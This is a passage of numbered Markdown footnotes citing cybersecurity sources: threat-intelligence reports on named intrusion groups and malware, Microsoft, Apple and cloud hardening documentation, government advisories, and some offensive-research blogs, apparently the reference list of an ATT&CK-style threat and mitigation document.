[^327]: [Microsoft Developer Support Power Apps Conditional Access](https://devblogs.microsoft.com/premier-developer/control-access-to-power-apps-and-power-automate-with-azure-ad-conditional-access-policies/)


[^328]: [RedCanary RaspberryRobin 2022](https://redcanary.com/blog/threat-intelligence/raspberry-robin/)


[^329]: [Cisco IOS Software Integrity Assurance - Deploy Signed IOS](https://tools.cisco.com/security/center/resources/integrity_assurance.html#34)


[^330]: [applescript signing](https://www.engadget.com/2013/10/23/applescript-and-automator-gain-new-features-in-os-x-mavericks/)


[^331]: [EnableMPRNotifications](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowslogon)


[^332]: [group-ib_redcurl2](https://www.group-ib.com/resources/research-hub/red-curl-2/)


[^333]: [Microsoft Purview Data Loss Prevention](https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp)


[^334]: [Pfammatter - Hidden Inbox Rules](https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/)


[^335]: [ntlm_relaying_kerberos_del](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)


[^336]: [Microsoft LSA](https://technet.microsoft.com/en-us/library/dn408187.aspx)


[^337]: [Microsoft Anti Spoofing](https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide)


[^338]: [Vulnerability and Exploit Detector](https://skanthak.homepage.t-online.de/sentinel.html)


[^339]: [TechNet Credential Theft](https://technet.microsoft.com/en-us/library/dn535501.aspx)


[^340]: [Microsoft_rec_block_rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)


[^341]: [Wikipedia Control Flow Integrity](https://en.wikipedia.org/wiki/Control-flow_integrity)


[^342]: [Lotus Blossom Jun 2015](https://www.paloaltonetworks.com/resources/research/unit42-operation-lotus-blossom.html)


[^343]: [BleepingComputer DDE Disabled in Word Dec 2017](https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/)


[^344]: [Unit 42 Palo Alto GitHub Actions Supply Chain Attack 2025](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack)


[^345]: [NetSPI ClickOnce](https://www.netspi.com/blog/technical-blog/adversary-simulation/all-you-need-is-one-a-clickonce-love-story/)


[^346]: [Crowdstrike AWS User Federation Persistence](https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/)


[^347]: [Microsoft W32Time May 2017](https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings)


[^348]: [TechNet Credential Guard](https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard)


[^349]: [Wald0 Guide to GPOs](https://wald0.com/?p=179)


[^350]: [Mandiant APT41](https://www.mandiant.com/resources/apt41-us-state-governments)


[^351]: [Chromium HSTS](https://www.chromium.org/hsts/)


[^352]: [Google Workspace Apps Script Restrict OAuth Scopes](https://developers.google.com/apps-script/guides/admin/monitor-restrict-oauth-scopes)


[^353]: [mac security virus popup](https://macsecurity.net/view/543-remove-guroshied-mac)


[^354]: [Beechey 2010](http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599)


[^355]: [Microsoft GPO Security Filtering](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/Policy/filtering-the-scope-of-a-gpo)


[^356]: [Kubernetes Cloud Native Security](https://kubernetes.io/docs/concepts/security/overview/)


[^357]: [Microsoft Learn ClickOnce and Authenticode](https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-and-authenticode?view=vs-2022)


[^358]: [ADSecurity Finding Passwords in SYSVOL](https://adsecurity.org/?p=2288)


[^359]: [ESET LoJax Sept 2018](https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf)


[^360]: [Secureworks - AT.exe Scheduled Task](https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems)


[^361]: [SensePost Outlook Forms](https://sensepost.com/blog/2017/outlook-forms-and-shells/)


[^362]: [Talos Kimsuky Nov 2021](https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html)


[^363]: [Microsoft Entra Configure OAuth Consent](https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/configure-user-consent?pivots=portal)


[^364]: [SE - Hackers Target Workday](https://www.cybersecuritydive.com/news/hackers-target-workday-in-social-engineering-attack/758095/#:~:text=Researchers%20cite%20increasing%20evidence%20of,told%20Cybersecurity%20Dive%20via%20email.)


[^365]: [TechNet RDP NLA](https://technet.microsoft.com/en-us/library/cc732713.aspx)


[^366]: [Novetta Winnti April 2015](https://web.archive.org/web/20150412223949/http://www.novetta.com/wp-content/uploads/2015/04/novetta_winntianalysis.pdf)


[^367]: [FireEye DLL Side-Loading](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)


[^368]: [Microsoft Disable NTLM Nov 2012](https://technet.microsoft.com/library/jj865668.aspx)


[^369]: [ESET Hermetic Wizard March 2022](https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine)


[^370]: [Microsoft Disable Autorun](https://support.microsoft.com/en-us/kb/967715)


[^371]: [Cisco IOS Software Integrity Assurance - Credentials Management](https://tools.cisco.com/security/center/resources/integrity_assurance.html#40)


[^372]: [Netspi PowerShell Execution Policy Bypass](https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)


[^373]: [Github Koadic](https://github.com/offsecginger/koadic)


[^374]: [Microsoft AlwaysInstallElevated 2018](https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)


[^375]: [Microsoft Windows Defender Application Control](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control)


[^376]: [ESET Attor Oct 2019](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Attor.pdf)


[^377]: [Trend Micro Black Basta October 2022](https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html)


[^378]: [Microsoft Replication ACL](https://support.microsoft.com/help/303972/how-to-grant-the-replicating-directory-changes-permission-for-the-micr)


[^379]: [ACSC Email Spoofing](https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf)


[^380]: [Cybersecurity Advisory GRU Brute Force Campaign July 2021](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)


[^381]: [Protecting Microsoft 365 From On-Premises Attacks](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/protect-m365-from-on-premises-attacks)


[^382]: [Akamai DGA Mitigation](https://medium.com/@yvyuz/a-death-match-of-domain-generation-algorithms-a5b5dbdc1c6e)


[^383]: [TrendMicro Tropic Trooper May 2020](https://documents.trendmicro.com/assets/Tech-Brief-Tropic-Trooper-s-Back-USBferry-Attack-Targets-Air-gapped-Environments.pdf)


[^384]: [Netskope Squirrelwaffle Oct 2021](https://www.netskope.com/blog/squirrelwaffle-new-malware-loader-delivering-cobalt-strike-and-qakbot)


[^385]: [Apple Developer Doco Hardened Runtime](https://developer.apple.com/documentation/security/hardened_runtime)


[^386]: [Comparitech Replay Attack](https://www.comparitech.com/blog/information-security/what-is-a-replay-attack/)


[^387]: [Microsoft SolarWinds Customer Guidance](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)


[^388]: [Broadcom VMCI Firewall](https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere/7-0/vsphere-virtual-machine-administration-guide-7-0/configuring-virtual-machine-hardwarevm-admin/virtual-machine-network-configurationvm-admin/serial-port-configurationvm-admin/configure-the-virtual-machine-communication-interface-firewallvm-admin.html)


[^389]: [Microsoft MS14-025](http://support.microsoft.com/kb/2962486)


[^390]: [Microsoft Credential Guard April 2017](https://docs.microsoft.com/windows/access-protection/credential-guard/credential-guard-how-it-works)


[^391]: [Bugcrowd Replay Attack](https://www.bugcrowd.com/glossary/replay-attack/)


[^392]: [NIST 800-63-3](https://pages.nist.gov/800-63-3/sp800-63b.html)


[^393]: [CISA AA20-239A BeagleBoyz August 2020](https://us-cert.cisa.gov/ncas/alerts/aa20-239a)


[^394]: [Microsoft Replace Process Token](https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token)


[^395]: [Securelist MuddyWater Oct 2018](https://securelist.com/muddywater/88059/)


[^396]: [STIG krbtgt reset](https://www.stigviewer.com/stig/windows_server_2016/2019-12-12/finding/V-91779)


[^397]: [Cybereason Cobalt Kitty 2017](https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf)


[^398]: [Symantec Orangeworm April 2018](https://www.symantec.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia)


[^399]: [Microsoft BITS](https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx)


[^400]: [Microsoft More information about DLL](https://msrc-blog.microsoft.com/2010/08/23/more-information-about-the-dll-preloading-remote-attack-vector/)


[^401]: [Wikibooks Grsecurity](https://en.wikibooks.org/wiki/Grsecurity/The_RBAC_System)


[^402]: [Cybereason Egregor Nov 2020](https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware)


[^403]: [TCG Trusted Platform Module](http://www.trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-Summary_04292008.pdf)


[^404]: [Microsoft Azure security baseline for Azure Active Directory](https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline)


[^405]: [Microsoft Preventing SMB](https://support.microsoft.com/en-us/help/3185535/preventing-smb-traffic-from-lateral-connections)


[^406]: [US-CERT Alert TA13-175A Risks of Default Passwords on the Internet](https://www.us-cert.gov/ncas/alerts/TA13-175A)


[^407]: [Microsoft Remote Use of Local](https://blogs.technet.microsoft.com/secguide/2018/12/10/remote-use-of-local-accounts-laps-changes-everything/)


[^408]: [ESET Twitter Ida Pro Nov 2021](https://x.com/ESETresearch/status/1458438155149922312)


[^409]: [CopyKittens Nov 2015](https://cdn2.hubspot.net/hubfs/1903456/Whitepapers/CopyKittens.pdf)


[^410]: [Harmj0y Domain Trusts](https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944)


[^411]: [MDMProfileConfigMacOS](https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf)


[^412]: [Unit 42 NOKKI Sept 2018](https://researchcenter.paloaltonetworks.com/2018/09/unit42-new-konni-malware-attacking-eurasia-southeast-asia/)


[^413]: [Microsoft DLL Security](https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx)


[^414]: [Microsoft Azure AD Admin Consent](https://docs.microsoft.com/en-us/azure/security/fundamentals/steps-secure-identity#block-end-user-consent)


[^415]: [SentinelOne NobleBaron June 2021](https://labs.sentinelone.com/noblebaron-new-poisoned-installers-could-be-used-in-supply-chain-attacks/)


[^416]: [CERT-EU DDoS March 2017](http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf)


[^417]: [trendmicro_redcurl](https://www.trendmicro.com/en_us/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html)


[^418]: [Cyber Safety Review Board: Lapsus](https://www.cisa.gov/sites/default/files/2023-08/CSRB_Lapsus%24_508c.pdf)


[^419]: [Microsoft Learn ClickOnce Config](https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior?view=vs-2022&tabs=csharp)


[^420]: [Secure Host Baseline EMET](https://github.com/iadgov/Secure-Host-Baseline/tree/master/EMET)


[^421]: [US-CERT TA17-156A SNMP Abuse 2017](https://us-cert.cisa.gov/ncas/alerts/TA17-156A)


[^422]: [Apple App Security Overview](https://support.apple.com/guide/security/app-security-overview-sec35dd877d0/1/web/1)


[^423]: [Palo Alto Comnie](https://researchcenter.paloaltonetworks.com/2018/01/unit42-comnie-continues-target-organizations-east-asia/)


[^424]: [Securing bash history](http://www.akyl.net/securing-bashhistory-file-make-sure-your-linux-system-users-won%E2%80%99t-hide-or-delete-their-bashhistory)


[^425]: [push notifications -infosecinstitute](https://www.infosecinstitute.com/resources/security-awareness/malicious-push-notifications-is-that-a-real-or-fake-windows-defender-update/)


[^426]: [Microsoft Winnti Jan 2017](https://blogs.technet.microsoft.com/mmpc/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/)


[^427]: [AWS DB VPC](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.WorkingWithRDSInstanceinaVPC.html)


[^428]: [Expel IO Evil in AWS](https://expel.io/blog/finding-evil-in-aws/)


[^429]: [Microsoft System Wide Com Keys](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx)


[^430]: [Palo Alto Office Test Sofacy](https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/)


[^431]: [Microsoft Protected View](https://support.office.com/en-us/article/What-is-Protected-View-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653)


[^432]: [Microsoft PowerShell CLM](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)


[^433]: [SentinelOne Aoqin Dragon June 2022](https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/)


[^434]: [Rancor Unit42 June 2018](https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/)


[^435]: [Microsoft LSA Protection Mar 2014](https://technet.microsoft.com/library/dn408187.aspx)


[^436]: [Microsoft SID Filtering Quarantining Jan 2009](https://technet.microsoft.com/library/cc794757.aspx)


[^437]: [AWS Management Account Best Practices](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_best-practices_mgmt-acct.html)


